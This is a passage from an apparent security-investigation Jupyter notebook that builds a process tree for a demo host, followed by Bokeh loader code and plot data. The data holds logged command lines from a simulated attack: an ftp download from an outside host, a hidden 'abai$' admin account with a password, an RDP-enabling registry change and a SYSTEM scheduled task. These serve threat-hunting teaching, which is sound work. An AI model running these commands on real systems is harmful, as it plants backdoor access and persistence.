    "proc_data = qry_prov.WindowsSecurity.list_host_processes(start=timescope.start,end=timescope.end, host_name=host_name)\n",
    "p_tree = ptree.build_process_tree(proc_data, show_progress=True)\n",
    "root_proc_sel = nbwidgets.SelectItem(\n",
    "    description=\"Select root process to investigate process tree\",\n",
    "    item_list=ptree.get_roots(p_tree)['NewProcessName'].to_list(),\n",
    "    #item_dict = root_procs\n",
    "    #action=show_logon,\n",
    "    height=\"200px\",\n",
    "    width=\"100%\",\n",
    "    auto_display=True,\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"5585\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
       "    if (id != null && id in Bokeh.index) {\n",
       "      Bokeh.index[id].model.document.clear();\n",
       "      delete Bokeh.index[id];\n",
       "    }\n",
       "\n",
       "    if (server_id !== undefined) {\n",
       "      // Clean up Bokeh references\n",
       "      var cmd = \"from bokeh.io.state import curstate; print(curstate().uuid_to_server['\" + server_id + \"'].get_sessions()[0].document.roots[0]._id)\";\n",
       "      cell.notebook.kernel.execute(cmd, {\n",
       "        iopub: {\n",
       "          output: function(msg) {\n",
       "            var id = msg.content.text.trim();\n",
       "            if (id in Bokeh.index) {\n",
       "              Bokeh.index[id].model.document.clear();\n",
       "              delete Bokeh.index[id];\n",
       "            }\n",
       "          }\n",
       "        }\n",
       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  var NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    var el = document.getElementById(\"5585\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = css_urls.length + js_urls.length;\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "\n",
       "    function on_error() {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    for (var i = 0; i < css_urls.length; i++) {\n",
       "      var url = css_urls[i];\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }\n",
       "\n",
       "    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n",
       "\n",
       "    for (var i = 0; i < js_urls.length; i++) {\n",
       "      var url = js_urls[i];\n",
       "      var element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      if (url in hashes) {\n",
       "        element.crossOrigin = \"anonymous\";\n",
       "        element.integrity = \"sha384-\" + hashes[url];\n",
       "      }\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  \n",
       "  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n",
       "  var css_urls = [];\n",
       "  \n",
       "\n",
       "  var inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    function(Bokeh) {\n",
       "    \n",
       "    \n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if (root.Bokeh !== undefined || force === true) {\n",
       "      \n",
       "    for (var i = 0; i < inline_js.length; i++) {\n",
       "      inline_js[i].call(root, root.Bokeh);\n",
       "    }\n",
       "    if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      var cell = $(document.getElementById(\"5585\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(css_urls, js_urls, function() {\n",
       "      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  var NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    var el = document.getElementById(\"5585\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error() {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (var i = 0; i < css_urls.length; i++) {\n      var url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n\n    for (var i = 0; i < js_urls.length; i++) {\n      var url = js_urls[i];\n      var element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.async = false;\n      element.src = url;\n      if (url in hashes) {\n        element.crossOrigin = \"anonymous\";\n        element.integrity = \"sha384-\" + hashes[url];\n      }\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n  var css_urls = [];\n  \n\n  var inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (var i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      var cell = $(document.getElementById(\"5585\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"e5b49ae8-3b83-46ca-b8fb-db603aefd2a6\" data-root-id=\"5715\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  var docs_json = {\"4922b6aa-62d9-4f7a-b533-877f31a290cb\":{\"roots\":{\"references\":[{\"attributes\":{\"children\":[{\"id\":\"5700\"},{\"id\":\"5713\"}]},\"id\":\"5715\",\"type\":\"Column\"},{\"attributes\":{\"dimensions\":\"height\"},\"id\":\"5607\",\"type\":\"PanTool\"},{\"attributes\":{\"axis\":{\"id\":\"5603\"},\"dimension\":1,\"grid_line_color\":\"navy\",\"ticker\":null,\"visible\":false},\"id\":\"5606\",\"type\":\"Grid\"},{\"attributes\":{\"end\":125,\"start\":104},\"id\":\"5593\",\"type\":\"Range1d\"},{\"attributes\":{},\"id\":\"5730\",\"type\":\"StringFormatter\"},{\"attributes\":{},\"id\":\"5595\",\"type\":\"LinearScale\"},{\"attributes\":{},\"id\":\"5731\",\"type\":\"StringEditor\"},{\"attributes\":{\"data\":{\"Account\":[\"NaN\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\",\"BlackHatDemoHos\\\\mstic_admin\"],\"CommandLine\":[\"NaN\",\"\\\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\\\"  \\\"C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\SimulateAttack.cmd\\\"\",\"\\\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\\\"  \\\"C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\WinBenignActivity.cmd\\\"\",\"\\\"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\\\" C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\MSTIC Attack (user).xml\",\"\\\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\IEXPLORE.EXE\\\" SCODEF:8428 CREDAT:17410 /prefetch:2\",\"\\\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\IEXPLORE.EXE\\\" SCODEF:8428 CREDAT:82946 /prefetch:2\",\"\\\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\\\"  \\\"C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\WinSimulateAlerts.cmd\\\"\",\"\\\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\\\"  \\\"C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\SimulateAttack.cmd\\\"\",\"C:\\\\windows\\\\system32\\\\cmd.exe /c \\\"\\\"C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\SimulateAttack.cmd\\\" \\\"\",\"\\\\??\\\\C:\\\\windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1\",\"cmd  /c echo Begin Security Demo tasks\",\"cmd  /c echo Any questions about the commands executed here then please contact one of\",\"cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com\",\"cmd  /c echo open ftp.wh401k.org \",\"ftp  -s:MG06.dll\",\"cacls.exe  C:\\\\Windows\\\\system32\\\\cscript.exe /e /t /g SYSTEM:F\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"findstr  \\\"abai$\\\"\",\"net  user abai$ Wf9k44_9d[=$ /add\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$ /add\",\"net  user abai$ Wf9k44_9d[=$\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$\",\"net  localgroup administrators \",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators \",\"findstr  \\\"abai$\\\"\",\"net  localgroup administrators abai$ /add\",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators abai$ /add\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"findstr  \\\"www.401hk.com\\\"\",\"net  user www.401hk.com Wf9k44_9d[=$ /add\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com Wf9k44_9d[=$ /add\",\"net  user www.401hk.com Wf9k44_sinc9d3[=$\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com Wf9k44_sinc9d3[=$\",\"net  user www.401hk.com /active:yes\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com /active:yes\",\"reg  ADD \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\\\"\",\"schtasks.exe  /create /tn  /tr \\\"c:\\\\pagefile.exe /?\\\" /sc hour /mo 1 /ru \\\"system\\\" /f\",\"ping  127.0.0.1 -n 100 \",\"\\\"C:\\\\windows\\\\system32\\\\cmd.exe\\\" \",\"\\\\??\\\\C:\\\\windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1\",\"cmd  /c echo Begin Security Demo tasks\",\"cmd  /c echo Any questions about the commands executed here then please contact one 